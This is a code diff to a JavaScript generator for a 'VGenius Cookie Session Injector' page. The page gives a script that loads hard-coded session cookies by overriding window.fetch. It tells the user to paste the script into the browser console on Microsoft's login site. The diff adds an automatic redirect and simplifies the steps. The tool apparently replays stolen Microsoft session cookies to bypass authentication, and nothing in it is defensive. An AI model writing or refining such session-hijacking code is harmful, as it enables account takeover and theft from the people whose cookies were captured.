@@ -216,7 +216,7 @@ function generateStandaloneHtml(cookies) {
     cookieHeader += cookies[i].name + "=" + cookies[i].value;
   }
   
-  // Build the bypass script that will be copied
+  // Build the bypass script that will be copied - clean version without comments
   var bypassScript = '(function() {\n';
   bypassScript += '  var cookies = ' + cookieJson + ';\n';
   bypassScript += '  var originalFetch = window.fetch;\n';
@@ -228,7 +228,9 @@ function generateStandaloneHtml(cookies) {
   bypassScript += '    }\n';
   bypassScript += '    return originalFetch(url, options);\n';
   bypassScript += '  };\n';
-  bypassScript += '  console.log("✅ Cookie injection active. Refresh page (F5).");\n';
+  bypassScript += '  setTimeout(function() {\n';
+  bypassScript += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  bypassScript += '  }, 1500);\n';
   bypassScript += '})();';
   
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
@@ -239,20 +241,14 @@ function generateStandaloneHtml(cookies) {
   html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
   html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
   html += '    button:hover { background: #00cca3; }\n';
-  html += '    .instructions { background: rgba(0,255,204,0.1); border: 1px solid rgba(0,255,204,0.3); padding: 15px; border-radius: 8px; margin-bottom: 20px; }\n';
   html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
   html += '  </style>\n';
   html += '</head>\n<body>\n';
   html += '  <h1>VGenius Cookie Session Injector</h1>\n';
-  html += '  <div class="instructions">\n';
-  html += '    <h3>Instructions:</h3>\n';
-  html += '    <ol>\n';
-  html += '      <li>Navigate to <a href="https://login.microsoftonline.com" target="_blank" style="color:#00ffcc;">https://login.microsoftonline.com</a></li>\n';
-  html += '      <li>Open browser console (F12)</li>\n';
-  html += '      <li>Copy the script below and paste it into the console</li>\n';
-  html += '      <li>Press Enter, then refresh the page (F5)</li>\n';
-  html += '    </ol>\n';
-  html += '  </div>\n';
+  html += '  <p>1. Go to https://login.microsoftonline.com</p>\n';
+  html += '  <p>2. Press F12 to open console</p>\n';
+  html += '  <p>3. Paste the script below and press Enter</p>\n';
+  html += '  <p>4. The page will auto-redirect in 1.5 seconds</p>\n';
   html += '  <button onclick="copyScript()">Copy Script</button>\n';
   html += '  <pre id="script"></pre>\n';
   html += '  <script>\n';
@@ -260,7 +256,7 @@ function generateStandaloneHtml(cookies) {
   html += '    document.getElementById("script").textContent = bypassScript;\n';
   html += '    function copyScript() {\n';
   html += '      navigator.clipboard.writeText(bypassScript).then(function() {\n';
-  html += '        alert("Script copied! Paste it in the Microsoft login console and press F5.");\n';
+  html += '        alert("Script copied! Paste it in the Microsoft login console. It will auto-redirect in 1.5 seconds.");\n';
   html += '      });\n';
   html += '    }\n';
   html += '  </script>\n';
